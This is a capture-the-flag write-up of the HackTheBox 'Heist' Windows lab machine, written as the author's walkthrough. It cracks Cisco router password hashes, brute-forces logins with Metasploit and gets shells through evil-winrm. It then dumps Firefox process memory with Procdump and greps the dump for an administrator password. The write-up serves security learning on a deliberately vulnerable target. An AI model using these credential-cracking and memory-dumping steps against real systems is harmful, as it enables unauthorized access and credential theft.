---
title: "Heist - HackTheBox"
date: "2019-11-30"
tags: ["Windows", "impacket", "winrm", "procdump", "memory dump"]
---

## Information gathering
Let's start with a port scan:
```
$ nmap -A -T4 10.10.10.149
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-30 14:36 EDT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.149
Host is up (0.20s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-30T18:37:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.67 seconds
```

As always, when there's a web server, that's the first thing that I look into,
and there's a login page:
![](/images/hackthebox/heist/login.png)

Given that we can login as guest, let's do it:
![](/images/hackthebox/heist/support.png)

It looks like someone needed help with the configuration of a Cisco router and
asked for help, it looks like it's username is Hazard. Let's check the
attachment:
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0 mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

Straight off we have three passwords hashes. The `secret 5` type can be cracked
with John the Ripper, so after writing it to a file, let's run `john secret5
--wordlist=rockyou.txt`. After a couple of seconds, we find out that the
password is `stealth1agent`.

The other two hashes can be decoded simply with an online tool, like [this](https://www.ifm.net.nz/cookbooks/passwordcracker.html) one, so here they are:
```
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```

## Further exploration
As we have a username and some passwords, we can try to authenticate to the `smb`
server:
```
$ smbclient -L \\\\10.10.10.149 -U 'hazard%stealth1agent'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.149 failed (Error NT_STATUS_IO_TIMEOUT)
Failed to connect with SMB1 -- no workgroup available
```

Out of luck, because of the order that they are written in the file, the first
one works!

We can use `lookupsid` from
[impacket](https://github.com/SecureAuthCorp/impacket) to enumerate users in the
Windows domain:
```
$ ./lookupsid.py 10.10.10.149/hazard:stealth1agent@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

## Getting a shell
We can now try to login with all usernames and passwords combinations that
we've found. There's a handy metasploit module that can help us. After writing
all the users in a file called `users` and the passwords in `pws`, let's load the
module and set the options:
![](/images/hackthebox/heist/metasploit-options.png)

And let's run it with `exploit`:
![](/images/hackthebox/heist/metasploit-results.png)

Cool! We've found the passwords of Hazard and Chase! Now we can use `evil-winrm`
(install it with `gem install --user evil-winrm`) to check if one of the two
users is allowed to get a remote shell:
```
$ evil-winrm -u Hazard -p stealth1agent -i 10.10.10.149
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```
No luck with Hazard, let's try with Chase:
```
$ evil-winrm -u Chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

And we got a shell! Let's check the flag:
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> Get-Acl user.txt
    Directory: C:\Users\Chase\Desktop

Path     Owner             Access
----     -----             ------
user.txt SUPPORTDESK\Chase NT AUTHORITY\SYSTEM Allow  FullControl...
```

## Privilege escalation

Listing the files in the Desktop, there's a curious one:
```
PS > type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Following the usual enumeration techniques and listing the running processes
with `Get-Process`, reveals us that there are some instances of Firefox running,
which stands out among the others. The first thing that I did was to search in
the user `AppData` folder for Firefox data like bookmarks, visited URLs and
things like that, but I had no luck with it.

The next thing that came to my mind is to dump the processes memory with
[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).
After downloading it on our machine, and moving it in the same folder that we
launched `evil-winrm` from, we can upload it using it's `upload` command:
![](/images/hackthebox/heist/upload.png)

Now we can dump the Firefox process memory using the PID from the `Get-Process`
command:
![](/images/hackthebox/heist/procdump.png)

Because I'm a PowerShell noob, I've downloaded the dump on my machine to
analyze it, with `download firefox.exe_191129_053757.dmp` and after (quite) a
bit of time I started searching for strings.

An interesting string to find in the memory dump would be `password`, so let's
search for it:
```
$ strings firefox.exe_191129_053757.dmp | grep -i password
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

Bingo! And we can get a shell with these credentials:
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-Acl root.txt
    Directory: C:\Users\Administrator\Desktop

Path     Owner                  Access
----     -----                  ------
root.txt BUILTIN\Administrators NT AUTHORITY\SYSTEM Allow  FullControl...
```

And we have access to the root flag!

## Wrapping up

I have to admit this one took me quite a bit of time, even though it was only 20
points, because I went down the `AppData` folder rabbit hole, and there were
some cache files and a password database that looked interesting. This is the
first time that I've analyzed a process' memory, which is an interesting
technique.

Thanks for reading!
